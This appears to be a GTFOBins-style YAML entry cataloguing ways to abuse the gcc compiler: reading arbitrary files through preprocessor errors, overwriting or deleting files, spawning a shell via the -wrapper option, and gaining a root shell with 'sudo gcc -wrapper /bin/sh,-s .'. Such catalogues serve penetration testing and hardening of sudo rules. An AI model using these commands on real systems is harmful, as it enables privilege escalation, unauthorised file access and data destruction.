---
functions:
  file-read:
    - code: |
        LFILE=file_to_read
        gcc -x c -E "$LFILE"
    - description: The file is read and parsed as a list of files (one per line), the content is disaplyed as error messages, thus this might not be suitable to read arbitrary data.
      code: |
        LFILE=file_to_read
        gcc @"$LFILE"
  file-write:  # XXX this should be file-delete
    - code: |
        LFILE=file_to_delete
        gcc -xc /dev/null -o $LFILE
  shell:
    - code: gcc -wrapper /bin/sh,-s .
  sudo:
    - code: sudo gcc -wrapper /bin/sh,-s .
---
